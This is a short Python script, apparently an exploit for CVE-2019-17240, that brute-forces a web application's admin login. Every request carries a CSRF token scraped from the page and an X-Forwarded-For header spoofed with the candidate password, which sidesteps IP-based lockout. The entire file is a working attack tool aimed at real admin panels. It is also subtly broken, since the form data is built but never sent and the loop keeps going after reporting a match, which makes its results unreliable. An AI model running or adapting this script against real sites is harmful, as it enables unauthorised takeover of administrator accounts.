import argparse
import requests
import re
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class CVE2019_17240:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, user, wordlist):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url + "/admin/login"
        self.user = user
        self.wordlist = wordlist
        self.session = requests.Session()
    
    def get_csrf_token(self, page):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        self.csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', page).group(1)

    def brute(self):
        print (LogColors.BLUE + "brute: " + self.wordlist + "..." + LogColors.ENDC)
        r = self.session.get(self.url)
        self.get_csrf_token(r.text)

        with open(self.wordlist, "r") as wl:
            for word in wl:
                word = word.strip()
                data = {
                    'tokenCSRF' : self.csrf_token,
                    'username' : self.user,
                    'password' : word,
                    'save' : '',
                }
                self.headers["X-Forwarded-For"] = word
                self.headers["Referer"] = self.url
                r = self.session.post(self.url, headers = self.headers, verify = False)
                if "password incorrect" in r.text:
                    print (LogColors.YELLOW + self.user + ":" + word + LogColors.ENDC)
                    self.get_csrf_token(r.text)
                else:
                    print (LogColors.GREEN + self.user + ":" + word + LogColors.ENDC)
                    print (LogColors.GREEN + "found :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--url', required = True, help = "target url")
    parser.add_argument('-u','--username', required = True, help = "username")
    parser.add_argument('-w','--wordlist', required = True, help = "wordlist file")
    args = vars(parser.parse_args())
    cve = CVE2019_17240(args['url'], args['username'], args['wordlist'])
    cve.brute()

